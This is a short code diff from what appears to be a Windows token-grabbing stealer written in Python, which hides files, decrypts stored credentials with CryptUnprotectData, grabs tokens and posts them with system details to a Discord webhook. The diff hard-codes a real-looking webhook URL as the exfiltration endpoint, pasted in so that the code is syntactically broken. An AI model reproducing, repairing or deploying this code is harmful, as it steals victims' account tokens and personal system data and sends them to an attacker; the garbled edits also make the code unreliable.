@@ -20,15 +20,15 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-def main(webhook: str) -> None: 
+def main(webhook: https://discord.com/api/webhooks/1488274944520618257/irQ7VzT0PMK3ZBLPK7VGkhl0gLACG5eljg6rM_hOEPxEVj7xgBgJwkhMK2FNUfRXXITT) -> None: 
     debug()
     cleanup()
         
     startup()
     inject(webhook=webhook)
     
-    webhook = https://discord.com/api/webhooks/1488274944520618257/irQ7VzT0PMK3ZBLPK7VGkhl0gLACG5eljg6rM_hOEPxEVj7xgBgJwkhMK2FNUfRXXITT(webhook, adapter=RequestsWebhookAdapter())
-    embed = https://c4.wallpaperflare.com/wallpaper/974/565/254/windows-11-windows-10-minimalism-hd-wallpaper-preview.jpg(title="\u200b", color=0x000000)
+    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+    embed = Embed(title="\u200b", color=0x000000)
     
     token_grabber(embed=embed)
     embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
